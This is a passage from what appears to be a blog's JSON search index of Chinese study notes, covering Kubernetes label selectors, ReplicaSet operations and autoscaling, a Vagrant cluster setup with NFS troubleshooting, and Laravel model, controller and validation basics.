id=\"Yaml-寫-IN-方法\"><a href=\"#Yaml-寫-IN-方法\" class=\"headerlink\" title=\"Yaml 寫 IN 方法\"></a>Yaml 寫 IN 方法</h3><p>kubectl get pods -l ‘environment in (production, qa)’</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">selector:</span></span><br><span class=\"line\"><span class=\"attr\">  matchLabels:</span></span><br><span class=\"line\"><span class=\"attr\">    component:</span> <span class=\"string\">redis</span></span><br><span class=\"line\"><span class=\"attr\">  matchExpressions:</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">&#123;key:</span> <span class=\"string\">tier,</span> <span class=\"attr\">operator:</span> <span class=\"string\">In,</span> <span class=\"attr\">values:</span> <span class=\"string\">[cache]&#125;</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">&#123;key:</span> <span class=\"string\">environment,</span> <span class=\"attr\">operator:</span> <span class=\"string\">NotIn,</span> <span class=\"attr\">values:</span> <span class=\"string\">[dev]&#125;</span></span><br></pre></td></tr></table></figure>\n<p>可參考:<a href=\"https://kubernetes.io/docs/concepts/overview/working-with-objects/labels/\" target=\"_blank\" rel=\"noopener\">Labels and Selectors | Kubernetes</a></p>\n<p>舊版寫法(因為相容還是可以跑)</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">selector:</span></span><br><span class=\"line\"><span class=\"attr\">  app:</span> <span class=\"string\">alpaca</span></span><br><span class=\"line\"><span class=\"attr\">  ver:</span> <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Annotation\"><a href=\"#Annotation\" class=\"headerlink\" title=\"Annotation\"></a>Annotation</h2><p>我看書沒特別介紹<br>感覺他就是Java HashMap 可以任意存任何key value 值</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">...</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  anotations:</span></span><br><span class=\"line\">    <span class=\"string\">xxxx.com/url:</span> <span class=\"string\">\"http://xxxx\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"移除範例-pods\"><a href=\"#移除範例-pods\" class=\"headerlink\" title=\"移除範例 pods\"></a>移除範例 pods</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl delete pods --all</span><br></pre></td></tr></table></figure>\n<p>delete 也可以搭配篩選器<code>selector</code></p>\n","categories":["Kubernetes"],"tags":["Kubernetes","label","annotation"]},{"title":"Kubernetes 的 ReplicaSet","url":"/blog/2021/02/13/Kubernetes-%E7%9A%84-ReplicasSet/","content":"<p>我目前看書上是舊版範例<br>所以使用官方<a href=\"https://kubernetes.io/zh/docs/concepts/workloads/controllers/replicaset/#how-a-replicaset-works\" target=\"_blank\" rel=\"noopener\">ReplicaSet | Kubernetes</a>範例<br>目前推薦 <a href=\"https://godleon.github.io/blog/Kubernetes/k8s-ReplicaSet-Overview/\" target=\"_blank\" rel=\"noopener\">[Kubernetes] ReplicaSet 介紹 | 小信豬的原始部落</a><br>這邊只是會放操作紀錄，不會很專業解說</p>\n<a id=\"more\"></a>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>一般建立 pod 完可以在建立 service<br>我以為 ReplicaSet 也是差不多樣子<br>但實作完才發現不一樣…<br>建立 ReplicaSet 就會建立 Pod</p>\n<h2 id=\"建立有-template-的-ReplicaSet\"><a href=\"#建立有-template-的-ReplicaSet\" class=\"headerlink\" title=\"建立有 template 的 ReplicaSet\"></a>建立有 template 的 ReplicaSet</h2><figure class=\"highlight yml\"><figcaption><span>fronted.yaml</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ReplicaSet</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">frontend</span></span><br><span class=\"line\"><span class=\"attr\">  labels:</span></span><br><span class=\"line\"><span class=\"attr\">    app:</span> <span class=\"string\">guestbook</span></span><br><span class=\"line\"><span class=\"attr\">    tier:</span> <span class=\"string\">frontend</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"comment\"># modify replicas according to your case</span></span><br><span class=\"line\"><span class=\"attr\">  replicas:</span> <span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"attr\">  selector:</span></span><br><span class=\"line\"><span class=\"attr\">    matchLabels:</span></span><br><span class=\"line\"><span class=\"attr\">      tier:</span> <span class=\"string\">frontend</span></span><br><span class=\"line\"><span class=\"attr\">  template:</span></span><br><span class=\"line\"><span class=\"attr\">    metadata:</span></span><br><span class=\"line\"><span class=\"attr\">      labels:</span></span><br><span class=\"line\"><span class=\"attr\">        tier:</span> <span class=\"string\">frontend</span></span><br><span class=\"line\"><span class=\"attr\">    spec:</span></span><br><span class=\"line\"><span class=\"attr\">      containers:</span></span><br><span class=\"line\"><span class=\"attr\">      - name:</span> <span class=\"string\">php-redis</span></span><br><span class=\"line\"><span class=\"attr\">        image:</span> <span class=\"string\">gcr.io/google_samples/gb-frontend:v3</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 建立 fronted ReplicaSet</span></span><br><span class=\"line\">kubectl apply -f https://kubernetes.io/examples/controllers/frontend.yaml</span><br><span class=\"line\"><span class=\"comment\"># replicaset.apps/frontend created</span></span><br><span class=\"line\"><span class=\"comment\"># 查看狀況</span></span><br><span class=\"line\">kubectl get rs</span><br><span class=\"line\"><span class=\"comment\"># NAME       DESIRED   CURRENT   READY   AGE</span></span><br><span class=\"line\"><span class=\"comment\"># frontend   3         3         3       25s</span></span><br><span class=\"line\">kubectl describle rs/fronted</span><br><span class=\"line\"><span class=\"comment\"># Name:         frontend</span></span><br><span class=\"line\"><span class=\"comment\"># Namespace:    default</span></span><br><span class=\"line\"><span class=\"comment\"># Selector:     tier=frontend</span></span><br><span class=\"line\"><span class=\"comment\"># Labels:       app=guestbook</span></span><br><span class=\"line\"><span class=\"comment\">#               tier=frontend</span></span><br><span class=\"line\"><span class=\"comment\"># Annotations:  &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># Replicas:     3 current / 3 desired</span></span><br><span class=\"line\"><span class=\"comment\"># Pods Status:  3 Running / 0 Waiting / 0 Succeeded / 0 Failed</span></span><br><span class=\"line\"><span class=\"comment\"># Pod Template:</span></span><br><span class=\"line\"><span class=\"comment\">#   Labels:  tier=frontend</span></span><br><span class=\"line\"><span class=\"comment\">#   Containers:</span></span><br><span class=\"line\"><span class=\"comment\">#    php-redis:</span></span><br><span class=\"line\"><span class=\"comment\">#     Image:        gcr.io/google_samples/gb-frontend:v3</span></span><br><span class=\"line\"><span class=\"comment\">#     Port:         &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#     Host Port:    &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#     Environment:  &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#     Mounts:       &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#   Volumes:        &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># Events:</span></span><br><span class=\"line\"><span class=\"comment\">#   Type    Reason            Age   From                   Message</span></span><br><span class=\"line\"><span class=\"comment\">#   ----    ------            ----  ----                   -------</span></span><br><span class=\"line\"><span class=\"comment\">#   Normal  SuccessfulCreate  53s   replicaset-controller  Created pod: frontend-bfdqg</span></span><br><span class=\"line\"><span class=\"comment\">#   Normal  SuccessfulCreate  53s   replicaset-controller  Created pod: frontend-7rlhd</span></span><br><span class=\"line\"><span class=\"comment\">#   Normal  SuccessfulCreate  53s   replicaset-controller  Created pod: frontend-p54kd</span></span><br><span class=\"line\">kubectl get pods </span><br><span class=\"line\"><span class=\"comment\"># NAME             READY   STATUS    RESTARTS   AGE</span></span><br><span class=\"line\"><span class=\"comment\"># frontend-b2zdv   1/1     Running   0          6m36s</span></span><br><span class=\"line\"><span class=\"comment\"># frontend-vcmts   1/1     Running   0          6m36s</span></span><br><span class=\"line\"><span class=\"comment\"># frontend-wtsmm   1/1     Running   0          6m36s</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl get pods frontend-b2zdv -o yaml</span><br></pre></td></tr></table></figure>\n<p>查看 meta.ownerReferences<br>這邊先跳過<br><a href=\"https://draveness.me/kubernetes-replicaset/\" target=\"_blank\" rel=\"noopener\">详解 Kubernetes ReplicaSet 的实现原理 - 面向信仰编程</a></p>\n<h2 id=\"無-template-建立\"><a href=\"#無-template-建立\" class=\"headerlink\" title=\"無 template 建立\"></a>無 template 建立</h2><figure class=\"highlight yml\"><figcaption><span>pod-rs.yaml</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">pod1</span></span><br><span class=\"line\"><span class=\"attr\">  labels:</span></span><br><span class=\"line\"><span class=\"attr\">    tier:</span> <span class=\"string\">frontend</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  containers:</span></span><br><span class=\"line\"><span class=\"attr\">  - name:</span> <span class=\"string\">hello1</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">gcr.io/google-samples/hello-app:2.0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">pod2</span></span><br><span class=\"line\"><span class=\"attr\">  labels:</span></span><br><span class=\"line\"><span class=\"attr\">    tier:</span> <span class=\"string\">frontend</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  containers:</span></span><br><span class=\"line\"><span class=\"attr\">  - name:</span> <span class=\"string\">hello2</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">gcr.io/google-samples/hello-app:1.0</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl apply -f https://kubernetes.io/examples/pods/pod-rs.yaml</span><br><span class=\"line\">kubectl get pods </span><br><span class=\"line\"><span class=\"comment\"># NAME             READY   STATUS        RESTARTS   AGE</span></span><br><span class=\"line\"><span class=\"comment\"># frontend-7rlhd   1/1     Running       0          10m</span></span><br><span class=\"line\"><span class=\"comment\"># frontend-bfdqg   1/1     Running       0          10m</span></span><br><span class=\"line\"><span class=\"comment\"># frontend-p54kd   1/1     Running       0          10m</span></span><br><span class=\"line\"><span class=\"comment\"># pod1             0/1     Terminating   0          5s</span></span><br><span class=\"line\"><span class=\"comment\"># pod2             0/1     Terminating   0          5s</span></span><br></pre></td></tr></table></figure>\n<p>這邊會看到，我們建立的 pod 沒有變建立起來<br>原因是 ReplicaSet 設定為三，已經建立過了(label 相同)</p>\n<p>如果清空，先建立兩個 pod 再 新增 rs<br>會友不一樣的結果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">NAME             READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">frontend-hmmj2   1/1     Running   0          9s</span><br><span class=\"line\">pod1             1/1     Running   0          36s</span><br><span class=\"line\">pod2             1/1     Running   0          36s</span><br></pre></td></tr></table></figure>\n<h2 id=\"擴展-ReplicaSet\"><a href=\"#擴展-ReplicaSet\" class=\"headerlink\" title=\"擴展 ReplicaSet\"></a>擴展 ReplicaSet</h2><h3 id=\"指令\"><a href=\"#指令\" class=\"headerlink\" title=\"指令\"></a>指令</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl scale replicasets fronted --replicas=4</span><br></pre></td></tr></table></figure>\n<p>指令操作可以直接套用<br>但大多數不推薦這個方式<br>假如 yaml 重建不會用到<br>大多數都從文件調整</p>\n<h2 id=\"kubectl-apply-套用\"><a href=\"#kubectl-apply-套用\" class=\"headerlink\" title=\"kubectl apply 套用\"></a>kubectl apply 套用</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl apply -f xxx.yaml</span><br></pre></td></tr></table></figure>\n<h2 id=\"自動擴展\"><a href=\"#自動擴展\" class=\"headerlink\" title=\"自動擴展\"></a>自動擴展</h2><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">autoscaling/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">HorizontalPodAutoscaler</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">frontend-scaler</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  scaleTargetRef:</span></span><br><span class=\"line\"><span class=\"attr\">    kind:</span> <span class=\"string\">ReplicaSet</span></span><br><span class=\"line\"><span class=\"attr\">    name:</span> <span class=\"string\">frontend</span></span><br><span class=\"line\"><span class=\"attr\">  minReplicas:</span> <span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"attr\">  maxReplicas:</span> <span class=\"number\">10</span></span><br><span class=\"line\"><span class=\"attr\">  targetCPUUtilizationPercentage:</span> <span class=\"number\">50</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl apply -f https://k8s.io/examples/controllers/hpa-rs.yaml</span><br></pre></td></tr></table></figure>\n<p>或只打指令<code>kubectl autoscale rs frontend --max=10 --min=3 --cpu-percent=50</code></p>\n<p>看完這麼多，官方推薦使用 Deployment 來替代 ReplicaSet<br>這單元簡單操作並不難</p>\n<h2 id=\"刪除-ReplicaSet-不刪除-pod\"><a href=\"#刪除-ReplicaSet-不刪除-pod\" class=\"headerlink\" title=\"刪除 ReplicaSet 不刪除 pod\"></a>刪除 ReplicaSet 不刪除 pod</h2><p>刪除 ReplicaSet 會一起刪除 pod<br>要刪除 ReplicaSet 不刪除 pod 情況下要使用</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 書上這樣寫，但好像廢棄了</span></span><br><span class=\"line\">kubectl delete rs fronted --cascade=<span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># warning: --cascade=false is deprecated (boolean value) and can be replaced with --cascade=orphan.</span></span><br><span class=\"line\">kubectl delete rs frontend --cascade=orphan</span><br><span class=\"line\"><span class=\"comment\"># 也能正常運作</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.cnblogs.com/hsyw/p/14173542.html\" target=\"_blank\" rel=\"noopener\">StatefulSet介绍 - taotaozh - 博客园</a><br>不知道跟這個有沒有關係<br>暫時不研究</p>\n","categories":["Kubernetes"],"tags":["kubernetes","replicasset"]},{"title":"Kubernetes 雜記","url":"/blog/2020/01/12/Kubernetes-%E9%9B%9C%E8%A8%98/","content":"<p>尚未整理完成</p>\n<a id=\"more\"></a>\n<h2 id=\"Vagrant-Virtailbox-架設環境\"><a href=\"#Vagrant-Virtailbox-架設環境\" class=\"headerlink\" title=\"Vagrant+Virtailbox 架設環境\"></a>Vagrant+Virtailbox 架設環境</h2><p>安裝</p>\n<ul>\n<li>Vagrant</li>\n<li>Virtalbox</li>\n</ul>\n<p>git clone <a href=\"https://github.com/pires/kubernetes-vagrant-coreos-cluster\" target=\"_blank\" rel=\"noopener\">pires/kubernetes-vagrant-coreos-cluster: Kubernetes cluster (for testing purposes) made easy with Vagrant and CoreOS.</a></p>\n<p>上面會遇到如下問題<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">WARNING: Vagrant has detected the `vagrant-triggers` plugin. This plugin conflicts</span><br><span class=\"line\">with the internal triggers implementation. Please uninstall the `vagrant-triggers`</span><br><span class=\"line\">plugin and run the command again if you wish to use the core trigger feature. To</span><br><span class=\"line\">uninstall the plugin, run the command shown below:</span><br><span class=\"line\"></span><br><span class=\"line\">  vagrant plugin uninstall vagrant-triggers</span><br><span class=\"line\"></span><br><span class=\"line\">Note that the community plugin `vagrant-triggers` and the core trigger feature</span><br><span class=\"line\">in Vagrant do not have compatible syntax.</span><br><span class=\"line\"></span><br><span class=\"line\">To disable this warning, set the environment variable `VAGRANT_USE_VAGRANT_TRIGGERS`.</span><br><span class=\"line\">Installed Version: 2.2.4</span><br><span class=\"line\">Latest Version: 2.2.6</span><br></pre></td></tr></table></figure></p>\n<p>但好像不用理這個</p>\n<p><a href=\"https://github.com/ecomm-integration-ballerina/kubernetes-cluster\" target=\"_blank\" rel=\"noopener\">ecomm-integration-ballerina/kubernetes-cluster: Kubernetes cluster using Vagrant, VirtualBox and Kubeadm</a><br><a href=\"https://medium.com/@raj10x/multi-node-kubernetes-cluster-with-vagrant-virtualbox-and-kubeadm-9d3eaac28b98\" target=\"_blank\" rel=\"noopener\">Multi Node Kubernetes Cluster with Vagrant, VirtualBox and Kubeadm</a></p>\n<p>別的也有這個<a href=\"https://github.com/rootsongjc/kubernetes-vagrant-centos-cluster/blob/master/README-cn.md\" target=\"_blank\" rel=\"noopener\">kubernetes-vagrant-centos-cluster/README-cn.md at master · rootsongjc/kubernetes-vagrant-centos-cluster</a></p>\n<p>vagrant up </p>\n<p>會遇到錯誤<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">==&gt; master: Running triggers before up...</span><br><span class=\"line\">==&gt; master: 2020-01-14 22:11:00 +0800: setting up Kubernetes master...</span><br><span class=\"line\">==&gt; master: Setting Kubernetes version 1.10.9</span><br><span class=\"line\">==&gt; master: Box &apos;coreos-alpha&apos; could not be found. Attempting to find and install...</span><br><span class=\"line\">    master: Box Provider: virtualbox</span><br><span class=\"line\">    master: Box Version: = 2345.0.0</span><br><span class=\"line\">==&gt; master: Loading metadata for box &apos;http://alpha.release.core-os.net/amd64-usr/current/coreos_production_vagrant.json&apos;</span><br><span class=\"line\">    master: URL: http://alpha.release.core-os.net/amd64-usr/current/coreos_production_vagrant.json</span><br><span class=\"line\">==&gt; master: Adding box &apos;coreos-alpha&apos; (v2345.0.0) for provider: virtualbox</span><br><span class=\"line\">    master: Downloading: https://alpha.release.core-os.net/amd64-usr/2345.0.0/coreos_production_vagrant.box</span><br><span class=\"line\">    master: Calculating and comparing box checksum...</span><br><span class=\"line\">==&gt; master: Successfully added box &apos;coreos-alpha&apos; (v2345.0.0) for &apos;virtualbox&apos;!</span><br><span class=\"line\">==&gt; master: Importing base box &apos;coreos-alpha&apos;...</span><br><span class=\"line\">==&gt; master: Matching MAC address for NAT networking...</span><br><span class=\"line\">==&gt; master: Checking if box &apos;coreos-alpha&apos; version &apos;2345.0.0&apos; is up to date...</span><br><span class=\"line\">==&gt; master: Setting the name of the VM: kubernetes-vagrant-coreos-cluster_master_1579011179473_57219</span><br><span class=\"line\">It appears your machine doesn&apos;t support NFS, or there is not an</span><br><span class=\"line\">adapter to enable NFS on this machine for Vagrant. Please verify</span><br><span class=\"line\">that `nfsd` is installed on your machine, and try again. If you&apos;re</span><br><span class=\"line\">on Windows, NFS isn&apos;t supported. If the problem persists, please</span><br><span class=\"line\">contact Vagrant support.</span><br></pre></td></tr></table></figure></p>\n<p>解決方是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get install nfs-common nfs-kernel-server</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.csdn.net/xuxiao1991101/article/details/50563329\" target=\"_blank\" rel=\"noopener\">Simplified install with vagrant_xuxiao1991101的博客-CSDN博客</a></p>\n<p>##</p>\n","categories":["Kubernetes"],"tags":["k8s"]},{"title":"Laravel 實作小記","url":"/blog/2019/07/16/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/","content":"<p>由於最近看 Laravel 都沒有用在實戰上面<br>想藉由這個機會時做看看<br>不寫還真的有些不習慣<br>特別紀錄一下</p>\n<p>–尚未整理完–</p>\n<a id=\"more\"></a>\n<h2 id=\"Laravel-新增檔案起手勢\"><a href=\"#Laravel-新增檔案起手勢\" class=\"headerlink\" title=\"Laravel 新增檔案起手勢\"></a>Laravel 新增檔案起手勢</h2><h3 id=\"建立一個-Model\"><a href=\"#建立一個-Model\" class=\"headerlink\" title=\"建立一個 Model\"></a>建立一個 Model</h3><p>–migration 順便產生 migrate 檔案</p>\n<p><strong>Table 取的名會是複數</strong><br><strong>Table 取的名會是複數</strong><br><strong>Table 取的名會是複數</strong><br>獎如是要自己新增的要注意!!!</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">php artisan make:model Event --migration</span><br><span class=\"line\">php artisan make:model Timer --migration</span><br></pre></td></tr></table></figure>\n<h3 id=\"建立一個-Controller\"><a href=\"#建立一個-Controller\" class=\"headerlink\" title=\"建立一個 Controller\"></a>建立一個 Controller</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">php artisan make:controller CustomersController</span><br><span class=\"line\">php artisan make:controller CustomersController --model=Customer</span><br></pre></td></tr></table></figure>\n<p><code>--migration</code> 我以為能順便新增 migrate<br>但是不行!!!</p>\n<h3 id=\"三個願望一次滿足\"><a href=\"#三個願望一次滿足\" class=\"headerlink\" title=\"三個願望一次滿足\"></a>三個願望一次滿足</h3><p>新建東西，想把所有 Controller 建立出來要怎麼用?<br><a href=\"https://stackoverflow.com/questions/43187735/laravel-5-4-create-model-controller-and-migration-in-single-artisan-command\" target=\"_blank\" rel=\"noopener\">Laravel 5.4 create model, controller and migration in single artisan command - Stack Overflow</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">php artisan make:model Todo -mcr</span><br></pre></td></tr></table></figure>\n<p>-m, –migration Create a new migration file for the model.<br>-c, –controller Create a new controller for the model.<br>-r, –resource Indicates if the generated controller should be a resource controller<br>或者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">php artisan make:model Todo -a</span><br></pre></td></tr></table></figure>\n<p>-a, –all Generate a migration, factory, and resource controller for the model</p>\n<h2 id=\"Model-要注意的事情\"><a href=\"#Model-要注意的事情\" class=\"headerlink\" title=\"Model 要注意的事情\"></a>Model 要注意的事情</h2><h3 id=\"fillable\"><a href=\"#fillable\" class=\"headerlink\" title=\"fillable\"></a>fillable</h3><p>每次新增 Model 完成，但通常會忘記填這個東西<br>仔細看這個，這個變數是防止 input 帶入 model 裡面<br>會被塞入奇奇怪怪的值<br>某種意義來說就是安全性!!</p>\n<h3 id=\"關聯\"><a href=\"#關聯\" class=\"headerlink\" title=\"關聯\"></a>關聯</h3><h3 id=\"hasMany-lt-gt-belongTo\"><a href=\"#hasMany-lt-gt-belongTo\" class=\"headerlink\" title=\"hasMany &lt;=&gt; belongTo\"></a>hasMany &lt;=&gt; belongTo</h3><p>hasMany</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">public function comments()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return $this-&gt;hasMany(&apos;App\\Comment&apos;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">public function post()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return $this-&gt;belongsTo(&apos;App\\Post&apos;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://blog.twbryce.com/laravel-%E5%A4%9A%E5%BC%B5table%E4%BD%BF%E7%94%A8orm%E6%9F%A5%E8%A9%A2-%E9%81%A0%E5%B1%A4%E4%B8%80%E5%B0%8D%E5%A4%9A%E9%97%9C%E8%81%AF/\" target=\"_blank\" rel=\"noopener\">Laravel 多張 table 使用 ORM 查詢 (遠層一對多關聯) – Bryce’S Note</a></p>\n<h3 id=\"Many-to-Many\"><a href=\"#Many-to-Many\" class=\"headerlink\" title=\"Many to Many\"></a>Many to Many</h3><p>我一直以為 X 對 X 就是講兩個 table，但是多對多簡單來講就是要用<code>3個 table</code><br>而中介 table 命名為<code>aaa_bbb</code>(照英文順序命名，如:<del>bbb_aaa</del>會有問題，但可透過 belongToMany(xxxx,’bbb_aaa’))</p>\n<p>簡單說一下，Many to Many 實作使用 3 個 table 但是只會寫 2 個 table(但 pivot 可自訂 class)，詳細官網一下，但通常應該不用寫<br>使用上 attach,detach,sync 控制 pivot 內容<br>pivot 通常不會建立 <code>id</code> 欄位<br>當然要設定也是能做到</p>\n<h2 id=\"ORM-with-預載入\"><a href=\"#ORM-with-預載入\" class=\"headerlink\" title=\"ORM with 預載入\"></a>ORM with 預載入</h2><p>只能用再 X 對多</p>\n<h4 id=\"Event-gt-timers-出現找不到-function-問題\"><a href=\"#Event-gt-timers-出現找不到-function-問題\" class=\"headerlink\" title=\"Event()-&gt;timers() 出現找不到 function 問題\"></a>Event()-&gt;timers() 出現找不到 function 問題</h4><p><code>BadMethodCallException with message &#39;Call to undefined method App/Event::timers()&#39;</code><br>哪尼我照官方範例新增一個 Project 怎麼會錯呢!!!<br>怎麼 Google 都找不到問題，最後我發現是<code>protected</code>關係，要用<code>public</code><br>為什麼呢? <code>App\\Event::find(1)</code> 沒有 new 出物件<br>所以<code>protected</code>的<code>timers()</code>就呼叫不到!!!<br>這是很正常的<br><strong>所以要用<code>public</code>!!!</strong><br><strong>所以要用<code>public</code>!!!</strong><br><strong>所以要用<code>public</code>!!!</strong><br>耗費一小時在查這個 orz</p>\n<h3 id=\"Model-find-20-實現原理\"><a href=\"#Model-find-20-實現原理\" class=\"headerlink\" title=\"Model::find(20) 實現原理\"></a>Model::find(20) 實現原理</h3><p>這篇寫的很清楚<br><a href=\"https://www.jianshu.com/p/026c6cd2767f\" target=\"_blank\" rel=\"noopener\">深入理解 laravel 中的 Eloquent ORM、查询构建器的核心原理 - 简书</a></p>\n<h3 id=\"命名建議\"><a href=\"#命名建議\" class=\"headerlink\" title=\"命名建議\"></a>命名建議</h3><h2 id=\"Form-表單這件事\"><a href=\"#Form-表單這件事\" class=\"headerlink\" title=\"Form 表單這件事\"></a>Form 表單這件事</h2><p>我覺得網頁這個要熟悉<br>才能掌握網頁的程式<br>但是實作才了解 Laravel 我還不太了解</p>\n<h3 id=\"create-和-edit-拆開寫兩個-View\"><a href=\"#create-和-edit-拆開寫兩個-View\" class=\"headerlink\" title=\"create 和 edit 拆開寫兩個 View\"></a>create 和 edit 拆開寫兩個 View</h3><p>一開始實作我覺得應該有方法讓兩個 view 合併<br>我從書上 view 有一個 <code>old()</code> 函式可以呼叫 redirect-&gt;with 出來東西<br>但是 view 變數沒抓到(未定義)的時候，可能程式錯誤無法顯示問題</p>\n<p>再繼續寫，我發現 from 表單我使用<code>route</code>定義的時候<br>我發現一件事情，action 導去路徑不一樣<br><code>@method(&#39;POST&#39;)</code> 和 <code>@method(&#39;POST&#39;)</code> 不一致<br>就算這些可以用邏輯去判斷網址<br>但我覺得會越來越亂<br>為何不如就分開兩個 view</p>\n<p>其實表單重複的部分<br>我覺得可以用<code>@include</code>帶入<br>不過我等熟悉看如何做到</p>\n<h2 id=\"contoller-view\"><a href=\"#contoller-view\" class=\"headerlink\" title=\"contoller view\"></a>contoller view</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> view(<span class=\"string\">'page/week1/list'</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> view(<span class=\"string\">'page.week1.show'</span>)-&gt;with(<span class=\"string\">'event'</span>, Event::find($id));</span><br><span class=\"line\"><span class=\"keyword\">return</span> view(<span class=\"string\">'page.week1.update'</span>, [<span class=\"string\">'event'</span> =&gt; $event]);</span><br></pre></td></tr></table></figure>\n<p>可以用多個帶值到 View 裡面<br>可算說是非常方便</p>\n<h2 id=\"驗證起手勢\"><a href=\"#驗證起手勢\" class=\"headerlink\" title=\"驗證起手勢\"></a>驗證起手勢</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$input = Input::all();</span><br><span class=\"line\"></span><br><span class=\"line\">$validator = Validator::make($input, [</span><br><span class=\"line\">    <span class=\"string\">'name'</span> =&gt; <span class=\"string\">'required|max:100'</span>,</span><br><span class=\"line\">]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($validator-&gt;fails()) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> redirect()-&gt;route(<span class=\"string\">'week1.edit'</span>, [<span class=\"string\">'id'</span> =&gt; $id])</span><br><span class=\"line\">        -&gt;withErrors($validator)</span><br><span class=\"line\">        -&gt;withInput();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>尚未了解事情</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span 